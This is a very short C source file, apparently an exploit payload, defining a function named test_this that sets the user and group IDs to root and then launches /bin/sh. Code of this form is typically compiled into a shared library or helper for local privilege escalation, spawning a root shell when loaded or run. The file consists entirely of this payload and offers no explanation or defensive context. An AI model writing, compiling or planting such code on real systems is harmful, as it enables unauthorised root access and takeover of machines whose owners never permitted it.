#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <unistd.h>
void test_this()
{
	setuid(0); setgid(0); system("/bin/sh");
} 
